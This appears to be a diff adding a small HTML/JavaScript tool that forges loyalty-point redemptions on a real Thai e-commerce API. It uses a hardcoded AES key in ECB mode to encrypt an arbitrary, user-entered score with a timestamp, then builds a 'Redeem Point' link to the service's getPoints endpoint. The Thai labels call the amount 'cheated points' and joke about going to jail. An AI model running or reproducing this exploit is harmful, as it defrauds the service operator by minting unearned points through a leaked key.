@@ -1,0 +1,61 @@
+<html>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<head>
+</head>
+<body>
+    <script src="rollups/aes.js"></script>
+    <script src="components/mode-ecb.js"></script>
+    <script src="components/pad-nopadding.js"></script>
+
+    จำนวนแต้ม: <input id="score" type="text" value="110">
+
+
+
+    <br><br>
+
+    <button onclick="gen_score()">Click to generate link</button>
+
+    <br><br>
+    <span id="total_score"></span>
+    <br><br>
+    <span id="cipher_score"></span>
+    <br><br>
+    <span id="link"></span>
+
+    <script>
+        function gen_score(){
+        var encrypted = 'yF8Ra34njTadL5JpHJ/w+7YNFEziIjBodFB2+CX8LNI=',
+        
+            key = CryptoJS.enc.Utf8.parse("23TLosPH+4r33p5L+W8oGQ==");
+            
+
+        var decrypted3 = CryptoJS.AES.decrypt(encrypted, key, {mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 });
+        // document.write("<br /> dec3: " + CryptoJS.enc.Utf8.stringify(decrypted3));
+// ====================================
+// document.write(" จำนวนแต้มที่โกง: " + word);
+        let tzoffset = (new Date()).getTimezoneOffset() * 60000;
+        let localISOTime = (new Date(Date.now() - tzoffset)).toISOString().slice(0, 23).replace(/-/g, "-").replace("T", "-").replace(":", "-").replace(":", "-").replace(/\..+/g, "-1");
+
+
+                    // 2019-12-2 14:38:33
+
+
+
+        let score = document.getElementById("score").value
+        let word = score + '_' + localISOTime;
+
+        document.getElementById("total_score").innerText = " จำนวนแต้มที่โกง: " + score;
+        document.getElementById("cipher_score").innerHTML = "<br /><br /><br /> Injected Parameter: " + word;
+        // --------------------
+
+        var key2 = CryptoJS.enc.Utf8.parse("23TLosPH+4r33p5L+W8oGQ==");
+
+        var srcs2 = CryptoJS.enc.Utf8.parse(word);
+        var encrypted2 = CryptoJS.AES.encrypt(srcs2, key2, {mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 });
+
+        document.getElementById("link").innerHTML = '<br /><br /><br /> Redeem Point: ' + "<a target='_blank' href='" + 'http://api.jd.co.th/getPoints?functionId=getPoints&body={"score":"' + encrypted2 +'"}&client=m&lang=th_TH' + "' > คลิกเพื่อติดคุก </a>";
+
+        }
+    </script>
+</body>
+</html>
